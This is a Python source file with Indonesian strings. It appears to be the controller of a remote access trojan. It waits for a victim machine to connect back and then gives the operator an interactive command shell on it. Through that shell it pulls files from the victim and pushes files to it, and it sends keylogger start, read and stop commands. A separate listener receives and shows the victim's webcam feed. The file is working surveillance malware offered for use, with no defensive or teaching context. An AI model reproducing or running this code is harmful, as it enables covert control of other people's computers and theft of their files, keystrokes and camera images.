import socket
import json
import os
import struct
import pickle
import cv2
import threading

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(('192.168.186.152', 1221))
print('Menunggu Koneksi.......')
soc.listen(1)

connect = soc.accept()
_target = connect[0]
ip = connect[1]
print(_target)
print(f'Target terhubung ke {str(ip)}')

def data_diterima():
        data = ''
        while True:
            try:
                data = data + _target.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue
                  

def download_file(filename):
    file = open(filename,  'wb')
    _target.settimeout(1)
    _file = _target.recv(1024)
    while _file:
          file.write(_file)
          try:
               _file = _target.recv(1024)
          except socket.timeout as e:
               break
    _target.settimeout(None)
    file.close()   

def upload_file(filename):
     file = open(filename, 'rb')
     _target.send(file.read())
     file.close()

def convers_byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('192.168.186.152', 8888))
    sock.listen(5)
    connect = sock.accept()
    tg = connect[0]
    ip = connect[1]

    bdata = b""
    payload_size = struct.calcsize("Q")

    while True:
            while len(bdata) < payload_size:
               packet = tg.recv(4*1024)
               if not packet: break
               bdata += packet
               
            packed_msg_size = bdata[:payload_size]
            bdata = bdata[payload_size:]
            msg_size = struct.unpack("Q", packed_msg_size)[0]
            while len(bdata) < msg_size: 
                 bdata += tg.recv(4*1024)
            frame_data = bdata[:msg_size]
            bdata = bdata[msg_size:]
            frame = pickle.loads(frame_data)
            cv2.imshow("Sedang Merekam.....", frame)
            key = cv2.waitKey(1)
            if key == 27:
                 break
    tg.close()
    cv2.destroyAllWindows()

def stream_cam():
     t = threading.Thread(target=convers_byte_stream)
     t.start()

def shell_communication():
        while True:
            command = input('cavzoxpreter>> ')
            data = json.dumps(command)  
            _target.send(data.encode())
            if command in ('exit', 'quit'):
                print('Koneksi terputus.......')
                break
            elif command == 'clear':
                os.system('clear')
            elif command[:3] == 'cd ':
                pass
            elif command[:8] == 'download':
                download_file(command[9:])
            elif command[:6] == 'upload':
                 upload_file(command[7:])
            elif command == 'start_logger':
                 pass
            elif command == 'baca_data':
                 data = _target.recv(1024).decode()
                 print(data)
            elif command == 'stop_logger':
                 pass
            elif command == 'start_cam':
                stream_cam()
            else:
                hasil = data_diterima()
                print(hasil)
                
shell_communication()